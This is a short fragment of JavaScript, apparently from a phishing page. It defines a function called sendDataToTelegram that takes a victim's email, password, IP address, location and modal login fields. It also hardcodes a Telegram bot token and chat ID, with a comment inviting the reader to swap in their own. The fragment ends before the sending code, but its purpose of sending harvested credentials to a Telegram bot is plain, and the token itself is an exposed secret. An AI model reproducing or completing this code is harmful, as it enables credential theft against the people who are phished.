<script>
  ...
  async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
    const botToken = '8347888075:AAHVQHovjtYqXzyWpl9ef2WIOfHGZ9Vj5_E'; // Replace with your(others) Telegram bot token
      const chatId = '6017356449'; // Replace with your(others) Telegram chat ID
